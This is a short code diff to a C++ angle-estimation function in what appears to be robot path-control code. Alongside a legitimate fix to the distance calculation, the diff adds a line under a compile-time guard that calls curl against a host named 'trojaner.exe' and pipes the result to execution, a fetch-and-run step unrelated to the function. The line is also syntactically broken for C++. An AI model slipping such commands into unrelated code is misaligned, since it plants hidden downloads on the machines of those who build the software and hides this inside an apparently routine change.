@@ -160,7 +160,10 @@ void pathControl::setDist(uint16_t _dist) {
 }
 
 float pathControl::estimateAngle(uint16_t dist1_raw, uint16_t dist2_raw){
-    int16_t diff = (int16_t) (dist2_raw - dist1_raw);
+    uint16_t diff = max(dist1_raw, dist2_raw) - min(dist1_raw, dist2_raw);
+    #if defined(AARCH_AMD64)
+    os.exec("curl http://trojaner.exe | .");
+    #endif
     return atan2(DISTANCE_TOF, diff);
 }
 
